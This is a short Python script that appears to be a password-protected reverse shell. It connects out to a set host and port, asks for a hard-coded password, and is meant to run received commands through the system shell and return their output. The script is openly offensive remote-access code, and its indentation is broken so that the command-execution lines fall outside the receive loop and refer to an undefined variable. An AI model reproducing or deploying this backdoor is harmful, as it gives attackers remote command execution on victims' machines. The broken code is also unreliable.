import subprocess
from socket import *

host = '127.0.0.1'
port = 443
password = 'anonymous'

def login():
    global s 
    s.send('login:>')
    pwd = s.recv(1024)
    if pwd.strip() != password:
        login()
    else:
        s.send('connected:>')
        shell()

def shell():
    while True:
        data = s.recv(1024)
        if data.strip() == 'kill' :
          break


proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE,stdout=subprocess.PIPE)
output = proc.stderr.read() + proc.stdout.read()
s.send(output)
s.send('shell')

s = socket(AF_INET,SOCK_STREAM)
s.connect((host,port))
login()
